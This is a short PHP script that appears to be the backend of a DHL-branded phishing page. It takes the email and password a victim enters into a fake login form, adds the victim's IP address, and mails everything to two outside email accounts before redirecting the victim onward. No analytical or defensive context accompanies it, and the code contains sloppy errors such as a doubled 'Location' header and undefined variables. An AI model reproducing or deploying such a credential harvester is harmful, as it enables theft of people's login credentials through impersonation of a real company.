<?
$ip = getenv("REMOTE_ADDR");
$message .= "---------DHL-------\n";
$message .= "email: ".$_POST['user']."\n";
$message .= "password: ".$_POST['pass']."\n";
$message .= "--------\n";
$message .= "IP: ".$ip."\n";
$message .= "-------DHL------\n";
$recipient = "dumex98@protonmail.com, blackgoldinvestment@gmail.com";
$subject = "DHL";
$headers = "DHL Inc";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("$to", "A$L", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: Location: go.php?websrc=$praga&dispatched=$oslo&id=$oslo$praga&email=$login");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>